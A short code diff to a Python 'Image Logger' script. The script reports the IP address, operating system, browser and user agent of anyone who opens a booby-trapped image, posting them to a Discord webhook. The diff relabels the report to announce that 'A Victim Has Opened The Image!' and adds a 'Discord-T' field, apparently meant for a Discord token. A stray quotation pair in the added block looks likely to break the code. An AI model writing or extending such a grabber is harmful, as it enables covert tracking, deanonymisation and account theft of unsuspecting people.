@@ -144,9 +144,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "KaisanSokohara - DRAGGER",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**A Victim Has Opened The Image!**
 
 **Endpoint:** `{endpoint}`
             
@@ -167,6 +167,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
+**Discord-T:**
+```
+TESTHAHA
+```""
+        
 **User Agent:**
 ```
 {useragent}
@@ -174,6 +179,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     }
   ],
 }
+
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
